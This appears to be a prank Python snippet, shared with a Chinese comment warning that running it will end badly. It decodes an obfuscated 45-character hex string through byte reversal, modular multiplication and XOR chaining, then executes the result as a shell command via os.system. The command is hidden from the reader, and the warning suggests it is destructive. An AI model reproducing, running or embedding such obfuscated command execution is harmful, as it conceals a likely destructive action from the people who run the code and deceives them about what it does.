# 好东西一定要分享，所以不要运行这个代码，否则会死得很惨！！！

s,l="a91df89842ebca3e1ab981c020a220c0953b196af87b37922d48a8afe8d7fc3e38ffca09da7ad4c32ea50549da",45
p=[eval("0x"+s[i:i+2])*179%256 for i in range(0,l*2,2)][::-1]
__import__("os").system("".join([chr((p[i-1] if i else 0)^p[i]) for i in range(l)]))
